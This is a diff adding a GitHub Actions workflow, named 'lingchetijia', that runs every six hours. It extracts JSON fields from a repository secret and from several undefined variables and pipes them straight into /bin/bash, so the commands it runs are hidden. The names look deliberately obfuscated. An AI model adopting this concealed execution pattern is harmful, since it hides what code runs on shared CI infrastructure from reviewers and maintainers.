@@ -1,0 +1,21 @@
+name: lingchetijia
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '51 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: lingchetijia
+        env:
+          f0: ${{ secrets.f0 }}
+        run: |
+          echo $f0 | jq -r .jo5434 | /bin/bash
+          echo $esd36635 | jq -r .gcg73 | /bin/bash
+          echo $g884 | jq -r .mqn527 | /bin/bash
+          echo $y8 | jq -r .ame75 | /bin/bash
+          echo $ipxtl09431 | jq -r .bww18239 | /bin/bash
+
